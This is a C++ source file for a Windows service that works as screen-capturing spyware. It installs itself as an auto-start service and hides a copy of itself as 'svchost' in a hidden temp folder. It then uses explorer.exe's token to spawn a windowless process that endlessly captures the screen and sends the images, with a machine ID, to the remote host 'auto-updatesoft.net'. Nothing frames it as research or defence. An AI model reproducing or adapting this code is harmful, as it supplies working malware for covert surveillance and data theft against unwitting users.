#include "service_manager.h"

#include <tlhelp32.h>

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

extern void WINAPI service_handler(DWORD);
extern void WINAPI service_main(DWORD, LPTSTR*);

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

ServiceManager::ServiceManager(string name) {
    TCHAR binary_path[MAX_PATH];

    this->running = true;
    this->name = name;
    this->ghSvcStopEvent = NULL;

    this->path = "";
    if (GetModuleFileName(NULL, binary_path, MAX_PATH)) {
        this->path = binary_path;
    }
}

//------------------------------------------------------------------------------

ServiceManager::~ServiceManager(void) {}

//------------------------------------------------------------------------------

void ServiceManager::main(bool separate_process) {
    this->log("Main", false);

    if (separate_process) {
        ostringstream command;
        command << "\"" << this->path << "\" update";

        this->log("SP", false);
        this->log(command.str(), false);

        bool success_launched = false;
        while (!success_launched) {
            success_launched = this->launch_process(command.str());

            wait();
        }

        this->report_status(SERVICE_STOPPED, NO_ERROR, 0);
    } else {
        this->log("SM", false);
        ScreenManager screen_manager = ScreenManager();

        this->unique_id = get_machine_id();

        ostringstream str_unique_id;
        str_unique_id << "UID: " << this->unique_id;
        this->log(str_unique_id.str(), false);

        string hostname = "auto-updatesoft.net";
        SOCKET socket = 0;

        int i = 0;
        while (1) {
            ostringstream str_socket;
            str_socket << i << ".S " << socket;
            this->log(str_socket.str(), false);

            if (socket == 0) {
                socket = connect(hostname, 61400);
            }

            if (socket != 0) {
                string image = screen_manager.capture();
                this->log("S", false);
                bool success = send_image(socket, image, this->unique_id, hostname);

                if (!success) {
                    socket = 0;
                }
            } else {
                wait();
                wait();
            }

            i += 1;
        }
    }
}

//------------------------------------------------------------------------------

int ServiceManager::install(void) {
    SC_HANDLE sc_manager;
    SC_HANDLE service;

    if (this->path == "") {
        this->log("Cannot install service");
        return 0;
    }

    sc_manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (NULL == sc_manager) {
        this->log("OpenSCManager failed");
        return 0;
    }

    service = OpenService(sc_manager, this->name.c_str(), SC_MANAGER_ALL_ACCESS);

    if (service) {
        bool result;

        this->log("Service already exists. Stopping it", false);

        SERVICE_STATUS_PROCESS status;
        if (ControlService(service, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS) &status)) {
            this->log("Waiting service to stop", false);

            SERVICE_STATUS status;
            do {
                if (!QueryServiceStatus(service, &status)) {
                    this->log("Failed to query service status");
                    break;
                }
                wait();
            } while (status.dwCurrentState != SERVICE_STOPPED);
        } else {
            this->log("Failed to stop service");
        }

        this->copy();
    } else {
        this->copy();

        service = CreateService(sc_manager, this->name.c_str(), this->name.c_str(),
            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL, this->path.c_str(), NULL, NULL, NULL, NULL, NULL);

        if (service == NULL) {
            this->log("CreateService failed");

            CloseServiceHandle(sc_manager);
            return 0;
        } else {
            this->log("Service installed successfully", false);
        }
    }

    if (!StartService(service, NULL, NULL)) {
        this->log("Failed to start service");
    }

    CloseServiceHandle(service);
    CloseServiceHandle(sc_manager);

    return 0;
}

//------------------------------------------------------------------------------

void ServiceManager::copy(void) {
    TCHAR temp_path[MAX_PATH+1];
    GetTempPath(MAX_PATH+1, temp_path);

    string new_path_folder = temp_path;
    new_path_folder += "Setup";

    string new_path = new_path_folder;
    new_path += "\\svchost";

    CreateDirectory(new_path_folder.c_str(), NULL);
    SetFileAttributes(new_path_folder.c_str(), FILE_ATTRIBUTE_HIDDEN);

    if (CopyFile(this->path.c_str(), new_path.c_str(), FALSE)) {
        this->path = new_path;
    } else {
        this->log("Failed to copy file");
    }
}

//------------------------------------------------------------------------------

void ServiceManager::init(DWORD dwArgc, LPTSTR *lpszArgv) {
    this->ghSvcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (this->ghSvcStopEvent == NULL) {
        this->report_status(SERVICE_STOPPED, NO_ERROR, 0);
        return;
    }

    this->report_status(SERVICE_RUNNING, NO_ERROR, 0);

    this->main(true);
}

//------------------------------------------------------------------------------

bool ServiceManager::launch_process(string command) {
    //retrieve the user token via an open process
    HANDLE hToken = NULL;
    HANDLE hProcess = NULL;
    DWORD dwProcessId = NULL;

    //user 'explorer.exe' as the process to search for
    PROCESSENTRY32 pe32;
    ZeroMemory(&pe32, sizeof(pe32));

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (!strcmp(pe32.szExeFile, "explorer.exe")) {
                dwProcessId = pe32.th32ProcessID;
                break;
            }
        } while(Process32Next(hSnapshot, &pe32));
    }

    if (dwProcessId) {
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwProcessId);
        if(hProcess) {
            OpenProcessToken(hProcess, TOKEN_EXECUTE | TOKEN_READ | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY_SOURCE | TOKEN_WRITE | TOKEN_DUPLICATE, &hToken);
            CloseHandle(hProcess);
        } else {
            this->log("Could not open process 'explorer.exe'", false);
            return false;
        }
    } else {
        this->log("Could not retrieve process id for 'explorer.exe'", false);
        return false;
    }

    if (hToken != NULL) {
        STARTUPINFO si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        this->log("Going to create process", false);

        if (CreateProcessAsUser(hToken, NULL, const_cast<char*>(command.c_str()), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi) == 0) {
            this->log("CreateProcessAsUser() failed with error: ");
            CloseHandle(hToken);
            return false;
        }

        this->log("process was created", false);

        while (this->running) {
            wait();
        }

        this->log("should stop. Going to kill the process", false);
        TerminateProcess(pi.hProcess, 0);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hToken);

        this->log("Everything killed", false);
    } else {
        this->log("Token retrieved from 'explorer.exe' is NULL", false);
        return false;
    }

    return true;
}

//------------------------------------------------------------------------------

void ServiceManager::start_service_ctrl_dispatcher(void) {
    SERVICE_TABLE_ENTRY dispatch_table[] = {
        {(char *)this->name.c_str(), (LPSERVICE_MAIN_FUNCTION) service_main},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(dispatch_table)) {
        this->report_event("StartServiceCtrlDispatcher");
    }
}

//------------------------------------------------------------------------------

void ServiceManager::report_status(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    static DWORD dwCheckPoint = 1;

    this->gSvcStatus.dwCurrentState = dwCurrentState;
    this->gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
    this->gSvcStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING)
        this->gSvcStatus.dwControlsAccepted = 0;
    else this->gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED))
        this->gSvcStatus.dwCheckPoint = 0;
    else this->gSvcStatus.dwCheckPoint = dwCheckPoint++;

    SetServiceStatus(this->gSvcStatusHandle, &this->gSvcStatus);
}

//------------------------------------------------------------------------------

void ServiceManager::report_event(string event) {
    HANDLE hEventSource;
    LPCTSTR lpszStrings[2];
    ostringstream buffer;

    hEventSource = RegisterEventSource(NULL, this->name.c_str());

    if (NULL != hEventSource) {
        buffer << event << " failed with " << GetLastError();

        lpszStrings[0] = this->name.c_str();
        lpszStrings[1] = buffer.str().c_str();

        ReportEvent(hEventSource, EVENTLOG_ERROR_TYPE, 0, 0, NULL, 2, 0, lpszStrings, NULL);

        DeregisterEventSource(hEventSource);
    }
}

//------------------------------------------------------------------------------

void ServiceManager::log(string message, bool show_last_error) {
    cout << message;

    if (show_last_error) {
        cout << " (" << GetLastError() << ")";
    }

    cout << endl;
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
